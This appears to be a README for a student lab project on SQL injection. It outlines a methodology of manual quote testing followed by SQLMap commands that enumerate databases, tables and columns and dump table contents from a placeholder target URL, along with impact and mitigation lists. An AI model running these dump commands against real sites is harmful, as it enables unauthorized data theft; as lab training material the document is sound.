<p align="center">
  <img src="https://readme-typing-svg.demolab.com/?lines=SQL+Injection+Attack+Simulation;Web+Application+Penetration+Testing;Offensive+Security+Project&font=Fira+Code&center=true&width=900&height=45&color=FF3333&vCenter=true&pause=1000" />
</p>

<h1 align="center">💉 SQL Injection (SQLi) – Practical Attack & Analysis</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Attack-SQL%20Injection-critical?style=for-the-badge&logo=hackthebox" />
  <img src="https://img.shields.io/badge/Category-Web%20Pentesting-red?style=for-the-badge&logo=owasp" />
  <img src="https://img.shields.io/badge/Environment-Lab%20Based-blue?style=for-the-badge&logo=kalilinux" />
</p>

---

## 🧾 Project Overview

This project demonstrates a **real-world simulation of SQL Injection (SQLi)** — one of the most critical and widely exploited vulnerabilities in modern web applications.

The assessment was performed in a **controlled lab environment** using a deliberately vulnerable web application.  
The objective was to **identify**, **exploit**, and **analyze** SQL Injection flaws using industry-standard offensive security tools.

> ⚠️ **Disclaimer**  
> This project is intended **strictly for educational and ethical security research purposes**.

---

## 🛠 Tools & Technologies

<p align="center">
  <img src="https://skillicons.dev/icons?i=linux" />
</p>

| Tool | Purpose |
|------|--------|
| 🐉 **Kali Linux** | Penetration testing environment |
| 💉 **SQLMap** | Automated SQL injection exploitation |
| 🌐 **Vulnerable Web Application** | Target for attack simulation |
| 🌍 **Web Browser** | Manual testing & validation |

---

## 🎯 Objectives

- Understand how **SQL Injection vulnerabilities** occur
- Identify **injectable input parameters**
- Exploit SQL Injection using **SQLMap**
- Enumerate databases, tables, and sensitive data
- Analyze **security impact and risk**
- Learn **defensive mitigation techniques**

---

## 🔍 Methodology

### 1️⃣ Vulnerability Identification
- Tested URL parameters using a single quote (`'`)
- Observed database error messages indicating SQL Injection

### 2️⃣ SQL Injection Confirmation
- Used SQLMap to validate injection points
- Confirmed backend database interaction

### 3️⃣ Database Enumeration
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
````

### 4️⃣ Table & Column Extraction

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns
```

### 5️⃣ Data Dumping

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump
```

### 6️⃣ Documentation

* Recorded vulnerable parameters
* Documented extracted data
* Analyzed attack impact

---

## ⚠️ Impact of SQL Injection

🚨 Successful SQL Injection attacks can result in:

* Unauthorized access to sensitive user data
* Modification or deletion of database records
* Authentication bypass
* Exposure of credentials and PII
* Full compromise of the web application

---

## 🔐 Prevention & Mitigation Techniques

🛡️ To defend against SQL Injection:

* Use **Parameterized Queries / Prepared Statements**
* Validate and sanitize all user input
* Use stored procedures
* Disable verbose database error messages
* Apply least privilege to database users
* Perform regular security testing

---

## 📁 Project Outcome

✅ Gained hands-on experience exploiting SQL Injection
✅ Understood real-world attacker techniques
✅ Improved practical web penetration testing skills
✅ Strengthened secure coding and defensive knowledge

This project significantly enhanced my understanding of **web application security** and **offensive testing methodologies**.

---

## ⚖️ Legal & Ethical Disclaimer

This project was conducted **only in a lab environment** on intentionally vulnerable applications.
Unauthorized testing on live systems is illegal and unethical.

---

⭐ **If this project helped you, consider starring the repository!**
🛡️ *Learn attacks to build stronger defenses.*
